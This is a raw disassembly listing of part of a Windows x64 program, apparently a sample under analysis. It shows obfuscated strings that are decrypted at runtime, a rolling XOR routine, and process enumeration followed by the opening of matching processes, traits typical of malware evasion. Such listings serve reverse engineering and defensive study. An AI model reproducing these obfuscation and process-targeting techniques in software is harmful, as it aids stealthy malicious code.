   140001746:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000174b:	e8 7e 1a 00 00       	call   0x1400031ce
   140001750:	85 c0                	test   %eax,%eax
   140001752:	0f 88 73 02 00 00    	js     0x1400019cb
   140001758:	8b 84 24 f8 01 00 00 	mov    0x1f8(%rsp),%eax
   14000175f:	4c 89 bc 24 92 00 00 	mov    %r15,0x92(%rsp)
   140001766:	00 
   140001767:	c7 84 24 9a 00 00 00 	movl   $0xf400fc,0x9a(%rsp)
   14000176e:	fc 00 f4 00 
   140001772:	66 c7 84 24 9e 00 00 	movw   $0xb3,0x9e(%rsp)
   140001779:	00 b3 00 
   14000177c:	48 01 d8             	add    %rbx,%rax
   14000177f:	80 3d ba aa 57 00 00 	cmpb   $0x0,0x57aaba(%rip)        # 0x14057c240
   140001786:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000178b:	75 2d                	jne    0x1400017ba
   14000178d:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   140001794:	00 
   140001795:	48 8d 0d 99 fc ff ff 	lea    -0x367(%rip),%rcx        # 0x140001435
   14000179c:	4d 89 7d 00          	mov    %r15,0x0(%r13)
   1400017a0:	c6 05 b7 aa 57 00 01 	movb   $0x1,0x57aab7(%rip)        # 0x14057c25e
   1400017a7:	48 89 05 a8 aa 57 00 	mov    %rax,0x57aaa8(%rip)        # 0x14057c256
   1400017ae:	c6 05 8b aa 57 00 01 	movb   $0x1,0x57aa8b(%rip)        # 0x14057c240
   1400017b5:	e8 7b fb ff ff       	call   0x140001335
   1400017ba:	80 3d 9d aa 57 00 00 	cmpb   $0x0,0x57aa9d(%rip)        # 0x14057c25e
   1400017c1:	74 2d                	je     0x1400017f0
   1400017c3:	48 8d 05 86 aa 57 00 	lea    0x57aa86(%rip),%rax        # 0x14057c250
   1400017ca:	48 8d 48 0e          	lea    0xe(%rax),%rcx
   1400017ce:	66 8b 30             	mov    (%rax),%si
   1400017d1:	48 83 c0 02          	add    $0x2,%rax
   1400017d5:	8d 96 4d 63 00 00    	lea    0x634d(%rsi),%edx
   1400017db:	66 81 e2 ff 00       	and    $0xff,%dx
   1400017e0:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400017e4:	48 39 c1             	cmp    %rax,%rcx
   1400017e7:	75 e5                	jne    0x1400017ce
   1400017e9:	c6 05 6e aa 57 00 00 	movb   $0x0,0x57aa6e(%rip)        # 0x14057c25e
   1400017f0:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400017f5:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400017fb:	4c 89 ea             	mov    %r13,%rdx
   1400017fe:	e8 75 27 00 00       	call   0x140003f78
   140001803:	85 c0                	test   %eax,%eax
   140001805:	75 1b                	jne    0x140001822
   140001807:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000180c:	e8 8b 18 00 00       	call   0x14000309c
   140001811:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140001816:	e8 81 18 00 00       	call   0x14000309c
   14000181b:	b0 01                	mov    $0x1,%al
   14000181d:	e9 c2 01 00 00       	jmp    0x1400019e4
   140001822:	80 3d ff a9 57 00 00 	cmpb   $0x0,0x57a9ff(%rip)        # 0x14057c228
   140001829:	75 27                	jne    0x140001852
   14000182b:	48 8d 0d 02 fc ff ff 	lea    -0x3fe(%rip),%rcx        # 0x140001434
   140001832:	c6 05 ff a9 57 00 01 	movb   $0x1,0x57a9ff(%rip)        # 0x14057c238
   140001839:	48 b8 fe 00 0a 00 01 	movabs $0xbd0001000a00fe,%rax
   140001840:	00 bd 00 
   140001843:	49 89 06             	mov    %rax,(%r14)
   140001846:	c6 05 db a9 57 00 01 	movb   $0x1,0x57a9db(%rip)        # 0x14057c228
   14000184d:	e8 e3 fa ff ff       	call   0x140001335
   140001852:	80 3d df a9 57 00 00 	cmpb   $0x0,0x57a9df(%rip)        # 0x14057c238
   140001859:	74 2d                	je     0x140001888
   14000185b:	48 8d 05 ce a9 57 00 	lea    0x57a9ce(%rip),%rax        # 0x14057c230
   140001862:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001866:	66 8b 38             	mov    (%rax),%di
   140001869:	48 83 c0 02          	add    $0x2,%rax
   14000186d:	8d 97 43 bd ff ff    	lea    -0x42bd(%rdi),%edx
   140001873:	66 81 e2 ff 00       	and    $0xff,%dx
   140001878:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   14000187c:	48 39 c8             	cmp    %rcx,%rax
   14000187f:	75 e5                	jne    0x140001866
   140001881:	c6 05 b0 a9 57 00 00 	movb   $0x0,0x57a9b0(%rip)        # 0x14057c238
   140001888:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000188d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140001893:	4c 89 f2             	mov    %r14,%rdx
   140001896:	e8 dd 26 00 00       	call   0x140003f78
   14000189b:	85 c0                	test   %eax,%eax
   14000189d:	0f 84 64 ff ff ff    	je     0x140001807
   1400018a3:	80 3d 66 a9 57 00 00 	cmpb   $0x0,0x57a966(%rip)        # 0x14057c210
   1400018aa:	75 2b                	jne    0x1400018d7
   1400018ac:	48 8d 0d 80 fb ff ff 	lea    -0x480(%rip),%rcx        # 0x140001433
   1400018b3:	c6 05 66 a9 57 00 01 	movb   $0x1,0x57a966(%rip)        # 0x14057c220
   1400018ba:	48 b8 5a 00 6d 00 62 	movabs $0x190062006d005a,%rax
   1400018c1:	00 19 00 
   1400018c4:	48 89 05 4d a9 57 00 	mov    %rax,0x57a94d(%rip)        # 0x14057c218
   1400018cb:	c6 05 3e a9 57 00 01 	movb   $0x1,0x57a93e(%rip)        # 0x14057c210
   1400018d2:	e8 5e fa ff ff       	call   0x140001335
   1400018d7:	80 3d 42 a9 57 00 00 	cmpb   $0x0,0x57a942(%rip)        # 0x14057c220
   1400018de:	74 2d                	je     0x14000190d
   1400018e0:	48 8d 05 31 a9 57 00 	lea    0x57a931(%rip),%rax        # 0x14057c218
   1400018e7:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400018eb:	66 8b 30             	mov    (%rax),%si
   1400018ee:	48 83 c0 02          	add    $0x2,%rax
   1400018f2:	8d 96 e7 7d 00 00    	lea    0x7de7(%rsi),%edx
   1400018f8:	66 81 e2 ff 00       	and    $0xff,%dx
   1400018fd:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140001901:	48 39 c1             	cmp    %rax,%rcx
   140001904:	75 e5                	jne    0x1400018eb
   140001906:	c6 05 13 a9 57 00 00 	movb   $0x0,0x57a913(%rip)        # 0x14057c220
   14000190d:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001912:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140001918:	48 8d 15 f9 a8 57 00 	lea    0x57a8f9(%rip),%rdx        # 0x14057c218
   14000191f:	e8 54 26 00 00       	call   0x140003f78
   140001924:	85 c0                	test   %eax,%eax
   140001926:	0f 84 db fe ff ff    	je     0x140001807
   14000192c:	80 3d 95 a8 57 00 00 	cmpb   $0x0,0x57a895(%rip)        # 0x14057c1c8
   140001933:	48 8d bc 24 92 00 00 	lea    0x92(%rsp),%rdi
   14000193a:	00 
   14000193b:	48 8d 35 7e 66 57 00 	lea    0x57667e(%rip),%rsi        # 0x140577fc0
   140001942:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   140001947:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001949:	48 8d 15 90 a8 57 00 	lea    0x57a890(%rip),%rdx        # 0x14057c1e0
   140001950:	48 8d b4 24 92 00 00 	lea    0x92(%rsp),%rsi
   140001957:	00 
   140001958:	75 28                	jne    0x140001982
   14000195a:	48 89 d7             	mov    %rdx,%rdi
   14000195d:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   140001962:	c6 05 a5 a8 57 00 01 	movb   $0x1,0x57a8a5(%rip)        # 0x14057c20e
   140001969:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000196b:	48 8d 0d c0 fa ff ff 	lea    -0x540(%rip),%rcx        # 0x140001432
   140001972:	c6 05 4f a8 57 00 01 	movb   $0x1,0x57a84f(%rip)        # 0x14057c1c8
   140001979:	e8 b7 f9 ff ff       	call   0x140001335
   14000197e:	48 8d 57 d2          	lea    -0x2e(%rdi),%rdx
   140001982:	80 3d 85 a8 57 00 00 	cmpb   $0x0,0x57a885(%rip)        # 0x14057c20e
   140001989:	74 2d                	je     0x1400019b8
   14000198b:	48 8d 05 4e a8 57 00 	lea    0x57a84e(%rip),%rax        # 0x14057c1e0
   140001992:	4c 8d 40 2e          	lea    0x2e(%rax),%r8
   140001996:	66 8b 38             	mov    (%rax),%di
   140001999:	48 83 c0 02          	add    $0x2,%rax
   14000199d:	8d 8f ff 05 00 00    	lea    0x5ff(%rdi),%ecx
   1400019a3:	66 81 e1 ff 00       	and    $0xff,%cx
   1400019a8:	66 89 48 fe          	mov    %cx,-0x2(%rax)
   1400019ac:	49 39 c0             	cmp    %rax,%r8
   1400019af:	75 e5                	jne    0x140001996
   1400019b1:	c6 05 56 a8 57 00 00 	movb   $0x0,0x57a856(%rip)        # 0x14057c20e
   1400019b8:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400019bd:	e8 ae 25 00 00       	call   0x140003f70
   1400019c2:	48 85 c0             	test   %rax,%rax
   1400019c5:	0f 85 3c fe ff ff    	jne    0x140001807
   1400019cb:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1400019d0:	e8 c7 16 00 00       	call   0x14000309c
   1400019d5:	e9 11 fd ff ff       	jmp    0x1400016eb
   1400019da:	e8 bd 16 00 00       	call   0x14000309c
   1400019df:	e9 92 fc ff ff       	jmp    0x140001676
   1400019e4:	48 81 c4 f8 03 00 00 	add    $0x3f8,%rsp
   1400019eb:	5b                   	pop    %rbx
   1400019ec:	5e                   	pop    %rsi
   1400019ed:	5f                   	pop    %rdi
   1400019ee:	5d                   	pop    %rbp
   1400019ef:	41 5c                	pop    %r12
   1400019f1:	41 5d                	pop    %r13
   1400019f3:	41 5e                	pop    %r14
   1400019f5:	41 5f                	pop    %r15
   1400019f7:	c3                   	ret
   1400019f8:	57                   	push   %rdi
   1400019f9:	56                   	push   %rsi
   1400019fa:	53                   	push   %rbx
   1400019fb:	48 83 ec 20          	sub    $0x20,%rsp
   1400019ff:	48 89 ce             	mov    %rcx,%rsi
   140001a02:	48 89 d3             	mov    %rdx,%rbx
   140001a05:	4c 89 c7             	mov    %r8,%rdi
   140001a08:	e8 53 25 00 00       	call   0x140003f60
   140001a0d:	66 8b 13             	mov    (%rbx),%dx
   140001a10:	3d fd 7f 00 00       	cmp    $0x7ffd,%eax
   140001a15:	7f 5d                	jg     0x140001a74
   140001a17:	66 85 d2             	test   %dx,%dx
   140001a1a:	74 58                	je     0x140001a74
   140001a1c:	4c 8d 4b 02          	lea    0x2(%rbx),%r9
   140001a20:	66 83 fa 25          	cmp    $0x25,%dx
   140001a24:	75 36                	jne    0x140001a5c
   140001a26:	66 83 7b 02 53       	cmpw   $0x53,0x2(%rbx)
   140001a2b:	48 89 f9             	mov    %rdi,%rcx
   140001a2e:	75 3b                	jne    0x140001a6b
   140001a30:	4c 8b 07             	mov    (%rdi),%r8
   140001a33:	48 83 c1 08          	add    $0x8,%rcx
   140001a37:	48 63 d0             	movslq %eax,%rdx
   140001a3a:	66 45 8b 10          	mov    (%r8),%r10w
   140001a3e:	89 d0                	mov    %edx,%eax
   140001a40:	66 45 85 d2          	test   %r10w,%r10w
   140001a44:	74 25                	je     0x140001a6b
   140001a46:	81 fa fe 7f 00 00    	cmp    $0x7ffe,%edx
   140001a4c:	74 1d                	je     0x140001a6b
   140001a4e:	66 44 89 14 56       	mov    %r10w,(%rsi,%rdx,2)
   140001a53:	49 83 c0 02          	add    $0x2,%r8
   140001a57:	48 ff c2             	inc    %rdx
   140001a5a:	eb de                	jmp    0x140001a3a
   140001a5c:	48 63 c8             	movslq %eax,%rcx
   140001a5f:	49 89 d9             	mov    %rbx,%r9
   140001a62:	ff c0                	inc    %eax
   140001a64:	66 89 14 4e          	mov    %dx,(%rsi,%rcx,2)
   140001a68:	48 89 f9             	mov    %rdi,%rcx
   140001a6b:	49 8d 59 02          	lea    0x2(%r9),%rbx
   140001a6f:	48 89 cf             	mov    %rcx,%rdi
   140001a72:	eb 99                	jmp    0x140001a0d
   140001a74:	48 98                	cltq
   140001a76:	66 c7 04 46 00 00    	movw   $0x0,(%rsi,%rax,2)
   140001a7c:	48 83 c4 20          	add    $0x20,%rsp
   140001a80:	5b                   	pop    %rbx
   140001a81:	5e                   	pop    %rsi
   140001a82:	5f                   	pop    %rdi
   140001a83:	c3                   	ret
   140001a84:	41 57                	push   %r15
   140001a86:	41 56                	push   %r14
   140001a88:	41 55                	push   %r13
   140001a8a:	41 54                	push   %r12
   140001a8c:	55                   	push   %rbp
   140001a8d:	57                   	push   %rdi
   140001a8e:	56                   	push   %rsi
   140001a8f:	53                   	push   %rbx
   140001a90:	48 83 ec 68          	sub    $0x68,%rsp
   140001a94:	4c 8d 3d 05 a7 57 00 	lea    0x57a705(%rip),%r15        # 0x14057c1a0
   140001a9b:	31 db                	xor    %ebx,%ebx
   140001a9d:	4d 8d 6f 21          	lea    0x21(%r15),%r13
   140001aa1:	48 89 cd             	mov    %rcx,%rbp
   140001aa4:	41 89 d4             	mov    %edx,%r12d
   140001aa7:	41 89 de             	mov    %ebx,%r14d
   140001aaa:	49 39 dc             	cmp    %rbx,%r12
   140001aad:	0f 84 87 00 00 00    	je     0x140001b3a
   140001ab3:	80 3d ce a6 57 00 00 	cmpb   $0x0,0x57a6ce(%rip)        # 0x14057c188
   140001aba:	48 8d 7c 24 3f       	lea    0x3f(%rsp),%rdi
   140001abf:	48 8d 35 3a 65 57 00 	lea    0x57653a(%rip),%rsi        # 0x140578000
   140001ac6:	b9 21 00 00 00       	mov    $0x21,%ecx
   140001acb:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001acd:	8a 54 1d 00          	mov    0x0(%rbp,%rbx,1),%dl
   140001ad1:	48 8d 74 24 3f       	lea    0x3f(%rsp),%rsi
   140001ad6:	75 2c                	jne    0x140001b04
   140001ad8:	b9 21 00 00 00       	mov    $0x21,%ecx
   140001add:	4c 89 ff             	mov    %r15,%rdi
   140001ae0:	88 54 24 2f          	mov    %dl,0x2f(%rsp)
   140001ae4:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001ae6:	48 8d 0d 44 f9 ff ff 	lea    -0x6bc(%rip),%rcx        # 0x140001431
   140001aed:	c6 05 cd a6 57 00 01 	movb   $0x1,0x57a6cd(%rip)        # 0x14057c1c1
   140001af4:	c6 05 8d a6 57 00 01 	movb   $0x1,0x57a68d(%rip)        # 0x14057c188
   140001afb:	e8 35 f8 ff ff       	call   0x140001335
   140001b00:	8a 54 24 2f          	mov    0x2f(%rsp),%dl
   140001b04:	80 3d b6 a6 57 00 00 	cmpb   $0x0,0x57a6b6(%rip)        # 0x14057c1c1
   140001b0b:	74 19                	je     0x140001b26
   140001b0d:	48 8d 05 8c a6 57 00 	lea    0x57a68c(%rip),%rax        # 0x14057c1a0
   140001b14:	80 28 23             	subb   $0x23,(%rax)
   140001b17:	48 ff c0             	inc    %rax
   140001b1a:	4c 39 e8             	cmp    %r13,%rax
   140001b1d:	75 f5                	jne    0x140001b14
   140001b1f:	c6 05 9b a6 57 00 00 	movb   $0x0,0x57a69b(%rip)        # 0x14057c1c1
   140001b26:	41 83 e6 1f          	and    $0x1f,%r14d
   140001b2a:	43 32 14 37          	xor    (%r15,%r14,1),%dl
   140001b2e:	88 54 1d 00          	mov    %dl,0x0(%rbp,%rbx,1)
   140001b32:	48 ff c3             	inc    %rbx
   140001b35:	e9 6d ff ff ff       	jmp    0x140001aa7
   140001b3a:	48 83 c4 68          	add    $0x68,%rsp
   140001b3e:	5b                   	pop    %rbx
   140001b3f:	5e                   	pop    %rsi
   140001b40:	5f                   	pop    %rdi
   140001b41:	5d                   	pop    %rbp
   140001b42:	41 5c                	pop    %r12
   140001b44:	41 5d                	pop    %r13
   140001b46:	41 5e                	pop    %r14
   140001b48:	41 5f                	pop    %r15
   140001b4a:	c3                   	ret
   140001b4b:	53                   	push   %rbx
   140001b4c:	48 83 ec 70          	sub    $0x70,%rsp
   140001b50:	31 db                	xor    %ebx,%ebx
   140001b52:	48 89 ca             	mov    %rcx,%rdx
   140001b55:	48 85 c9             	test   %rcx,%rcx
   140001b58:	74 73                	je     0x140001bcd
   140001b5a:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140001b5f:	31 c0                	xor    %eax,%eax
   140001b61:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140001b67:	48 89 d9             	mov    %rbx,%rcx
   140001b6a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001b6f:	e8 c6 f8 ff ff       	call   0x14000143a
   140001b74:	45 31 c0             	xor    %r8d,%r8d
   140001b77:	31 d2                	xor    %edx,%edx
   140001b79:	31 c9                	xor    %ecx,%ecx
   140001b7b:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140001b80:	45 31 c9             	xor    %r9d,%r9d
   140001b83:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   140001b88:	89 4c 24 58          	mov    %ecx,0x58(%rsp)
   140001b8c:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001b91:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   140001b96:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140001b9b:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001ba0:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001ba5:	b3 01                	mov    $0x1,%bl
   140001ba7:	c7 44 24 40 30 00 00 	movl   $0x30,0x40(%rsp)
   140001bae:	00 
   140001baf:	e8 c6 15 00 00       	call   0x14000317a
   140001bb4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001bb9:	85 c0                	test   %eax,%eax
   140001bbb:	78 0b                	js     0x140001bc8
   140001bbd:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001bc1:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140001bc5:	0f 97 c3             	seta   %bl
   140001bc8:	e8 cf 14 00 00       	call   0x14000309c
   140001bcd:	89 d8                	mov    %ebx,%eax
   140001bcf:	48 83 c4 70          	add    $0x70,%rsp
   140001bd3:	5b                   	pop    %rbx
   140001bd4:	c3                   	ret
   140001bd5:	56                   	push   %rsi
   140001bd6:	48 83 ec 30          	sub    $0x30,%rsp
   140001bda:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001bdf:	4c 89 c6             	mov    %r8,%rsi
   140001be2:	e8 71 23 00 00       	call   0x140003f58
   140001be7:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001bec:	48 89 f2             	mov    %rsi,%rdx
   140001bef:	48 83 c4 30          	add    $0x30,%rsp
   140001bf3:	5e                   	pop    %rsi
   140001bf4:	e9 57 23 00 00       	jmp    0x140003f50
   140001bf9:	41 57                	push   %r15
   140001bfb:	41 56                	push   %r14
   140001bfd:	41 55                	push   %r13
   140001bff:	41 54                	push   %r12
   140001c01:	55                   	push   %rbp
   140001c02:	57                   	push   %rdi
   140001c03:	56                   	push   %rsi
   140001c04:	53                   	push   %rbx
   140001c05:	48 81 ec 78 03 00 00 	sub    $0x378,%rsp
   140001c0c:	31 c0                	xor    %eax,%eax
   140001c0e:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140001c13:	48 89 cb             	mov    %rcx,%rbx
   140001c16:	4c 89 c5             	mov    %r8,%rbp
   140001c19:	4c 89 ce             	mov    %r9,%rsi
   140001c1c:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140001c23:	00 
   140001c24:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140001c2b:	00 
   140001c2c:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   140001c33:	00 
   140001c34:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   140001c3b:	00 
   140001c3c:	48 89 94 24 c8 03 00 	mov    %rdx,0x3c8(%rsp)
   140001c43:	00 
   140001c44:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140001c49:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   140001c4e:	44 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8d
   140001c55:	00 
   140001c56:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001c5b:	48 8b 94 24 80 00 00 	mov    0x80(%rsp),%rdx
   140001c62:	00 
   140001c63:	e8 2d 15 00 00       	call   0x140003195
   140001c68:	3d 04 00 00 c0       	cmp    $0xc0000004,%eax
   140001c6d:	75 26                	jne    0x140001c95
   140001c6f:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   140001c74:	45 31 c0             	xor    %r8d,%r8d
   140001c77:	48 89 fa             	mov    %rdi,%rdx
   140001c7a:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001c7e:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140001c85:	00 
   140001c86:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140001c8d:	00 
   140001c8e:	e8 60 14 00 00       	call   0x1400030f3
   140001c93:	eb b4                	jmp    0x140001c49
   140001c95:	85 c0                	test   %eax,%eax
   140001c97:	0f 88 78 01 00 00    	js     0x140001e15
   140001c9d:	49 bd 74 00 87 00 7f 	movabs $0x7b007f00870074,%r13
   140001ca4:	00 7b 00 
   140001ca7:	31 ff                	xor    %edi,%edi
   140001ca9:	49 be 7e 00 81 00 74 	movabs $0x8100740081007e,%r14
   140001cb0:	00 81 00 
   140001cb3:	49 bf 3d 00 74 00 87 	movabs $0x7400870074003d,%r15
   140001cba:	00 74 00 
   140001cbd:	41 89 fa             	mov    %edi,%r10d
   140001cc0:	4c 03 94 24 80 00 00 	add    0x80(%rsp),%r10
   140001cc7:	00 
   140001cc8:	66 41 83 7a 38 00    	cmpw   $0x0,0x38(%r10)
   140001cce:	4d 89 d4             	mov    %r10,%r12
   140001cd1:	0f 84 23 01 00 00    	je     0x140001dfa
   140001cd7:	80 3d a2 a6 57 00 00 	cmpb   $0x0,0x57a6a2(%rip)        # 0x14057c380
   140001cde:	4c 89 ac 24 60 01 00 	mov    %r13,0x160(%rsp)
   140001ce5:	00 
   140001ce6:	4c 89 b4 24 68 01 00 	mov    %r14,0x168(%rsp)
   140001ced:	00 
   140001cee:	4c 89 bc 24 70 01 00 	mov    %r15,0x170(%rsp)
   140001cf5:	00 
   140001cf6:	66 c7 84 24 78 01 00 	movw   $0xf,0x178(%rsp)
   140001cfd:	00 0f 00 
   140001d00:	75 38                	jne    0x140001d3a
   140001d02:	0f 28 84 24 60 01 00 	movaps 0x160(%rsp),%xmm0
   140001d09:	00 
   140001d0a:	0f 10 8c 24 6a 01 00 	movups 0x16a(%rsp),%xmm1
   140001d11:	00 
   140001d12:	48 8d 0d 20 f7 ff ff 	lea    -0x8e0(%rip),%rcx        # 0x140001439
   140001d19:	c6 05 8a a6 57 00 01 	movb   $0x1,0x57a68a(%rip)        # 0x14057c3aa
   140001d20:	c6 05 59 a6 57 00 01 	movb   $0x1,0x57a659(%rip)        # 0x14057c380
   140001d27:	0f 29 05 62 a6 57 00 	movaps %xmm0,0x57a662(%rip)        # 0x14057c390
   140001d2e:	0f 11 0d 65 a6 57 00 	movups %xmm1,0x57a665(%rip)        # 0x14057c39a
   140001d35:	e8 fb f5 ff ff       	call   0x140001335
   140001d3a:	80 3d 69 a6 57 00 00 	cmpb   $0x0,0x57a669(%rip)        # 0x14057c3aa
   140001d41:	74 2c                	je     0x140001d6f
   140001d43:	48 8d 05 46 a6 57 00 	lea    0x57a646(%rip),%rax        # 0x14057c390
   140001d4a:	48 8d 48 1a          	lea    0x1a(%rax),%rcx
   140001d4e:	66 8b 10             	mov    (%rax),%dx
   140001d51:	48 83 c0 02          	add    $0x2,%rax
   140001d55:	66 81 ea 0f 58       	sub    $0x580f,%dx
   140001d5a:	66 81 e2 ff 00       	and    $0xff,%dx
   140001d5f:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140001d63:	48 39 c8             	cmp    %rcx,%rax
   140001d66:	75 e6                	jne    0x140001d4e
   140001d68:	c6 05 3b a6 57 00 00 	movb   $0x0,0x57a63b(%rip)        # 0x14057c3aa
   140001d6f:	49 8b 4c 24 40       	mov    0x40(%r12),%rcx
   140001d74:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140001d7a:	48 8d 15 0f a6 57 00 	lea    0x57a60f(%rip),%rdx        # 0x14057c390
   140001d81:	e8 e2 21 00 00       	call   0x140003f68
   140001d86:	85 c0                	test   %eax,%eax
   140001d88:	75 70                	jne    0x140001dfa
   140001d8a:	31 c0                	xor    %eax,%eax
   140001d8c:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140001d91:	4c 8d 8c 24 08 01 00 	lea    0x108(%rsp),%r9
   140001d98:	00 
   140001d99:	ba 80 00 00 00       	mov    $0x80,%edx
   140001d9e:	48 89 84 24 68 01 00 	mov    %rax,0x168(%rsp)
   140001da5:	00 
   140001da6:	31 c0                	xor    %eax,%eax
   140001da8:	4c 8d 84 24 60 01 00 	lea    0x160(%rsp),%r8
   140001daf:	00 
   140001db0:	89 84 24 78 01 00 00 	mov    %eax,0x178(%rsp)
   140001db7:	31 c0                	xor    %eax,%eax
   140001db9:	48 89 84 24 70 01 00 	mov    %rax,0x170(%rsp)
   140001dc0:	00 
   140001dc1:	48 89 84 24 80 01 00 	mov    %rax,0x180(%rsp)
   140001dc8:	00 
   140001dc9:	48 89 84 24 88 01 00 	mov    %rax,0x188(%rsp)
   140001dd0:	00 
   140001dd1:	48 89 84 24 10 01 00 	mov    %rax,0x110(%rsp)
   140001dd8:	00 
   140001dd9:	49 8b 44 24 50       	mov    0x50(%r12),%rax
   140001dde:	c7 84 24 60 01 00 00 	movl   $0x30,0x160(%rsp)
   140001de5:	30 00 00 00 
   140001de9:	48 89 84 24 08 01 00 	mov    %rax,0x108(%rsp)
   140001df0:	00 
   140001df1:	e8 30 13 00 00       	call   0x140003126
   140001df6:	85 c0                	test   %eax,%eax
   140001df8:	79 1b                	jns    0x140001e15
   140001dfa:	41 8b 04 24          	mov    (%r12),%eax
   140001dfe:	85 c0                	test   %eax,%eax
   140001e00:	74 13                	je     0x140001e15
   140001e02:	01 f8                	add    %edi,%eax
   140001e04:	48 89 c7             	mov    %rax,%rdi
   140001e07:	48 3b 84 24 88 00 00 	cmp    0x88(%rsp),%rax
   140001e0e:	00 
   140001e0f:	0f 82 a8 fe ff ff    	jb     0x140001cbd
   140001e15:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140001e1a:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001e1e:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140001e25:	00 
   140001e26:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140001e2c:	e8 da 12 00 00       	call   0x14000310b
   140001e31:	48 83 7c 24 78 00    	cmpq   $0x0,0x78(%rsp)
   140001e37:	75 09                	jne    0x140001e42
   140001e39:	48 c7 44 24 78 ff ff 	movq   $0xffffffffffffffff,0x78(%rsp)
   140001e40:	ff ff 
   140001e42:	45 31 db             	xor    %r11d,%r11d
   140001e45:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   140001e49:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   140001e50:	00 
   140001e51:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e56:	4c 89 9c 24 90 00 00 	mov    %r11,0x90(%rsp)
   140001e5d:	00 
   140001e5e:	48 8d bc 24 60 01 00 	lea    0x160(%rsp),%rdi
   140001e65:	00 
   140001e66:	e8 d9 12 00 00       	call   0x140003144
   140001e6b:	e8 40 0f 00 00       	call   0x140002db0
   140001e70:	b9 84 00 00 00       	mov    $0x84,%ecx
   140001e75:	4c 8b 60 20          	mov    0x20(%rax),%r12
   140001e79:	31 c0                	xor    %eax,%eax
   140001e7b:	80 3d e6 a4 57 00 00 	cmpb   $0x0,0x57a4e6(%rip)        # 0x14057c368
   140001e82:	66 c7 84 24 10 01 00 	movw   $0xbf,0x110(%rsp)
   140001e89:	00 bf 00 
   140001e8c:	f3 ab                	rep stos %eax,(%rdi)
   140001e8e:	48 8d bc 24 60 01 00 	lea    0x160(%rsp),%rdi
   140001e95:	00 
   140001e96:	48 b8 1b 00 fe 00 fe 	movabs $0x1b00fe00fe001b,%rax
   140001e9d:	00 1b 00 
   140001ea0:	48 89 84 24 08 01 00 	mov    %rax,0x108(%rsp)
   140001ea7:	00 
   140001ea8:	75 2a                	jne    0x140001ed4
   140001eaa:	48 8d 0d 87 f5 ff ff 	lea    -0xa79(%rip),%rcx        # 0x140001438
   140001eb1:	c6 05 c2 a4 57 00 01 	movb   $0x1,0x57a4c2(%rip)        # 0x14057c37a
   140001eb8:	48 89 05 b1 a4 57 00 	mov    %rax,0x57a4b1(%rip)        # 0x14057c370
   140001ebf:	66 c7 05 b0 a4 57 00 	movw   $0xbf,0x57a4b0(%rip)        # 0x14057c378
   140001ec6:	bf 00 
   140001ec8:	c6 05 99 a4 57 00 01 	movb   $0x1,0x57a499(%rip)        # 0x14057c368
   140001ecf:	e8 61 f4 ff ff       	call   0x140001335
   140001ed4:	80 3d 9f a4 57 00 00 	cmpb   $0x0,0x57a49f(%rip)        # 0x14057c37a
   140001edb:	48 8d 0d 8e a4 57 00 	lea    0x57a48e(%rip),%rcx        # 0x14057c370
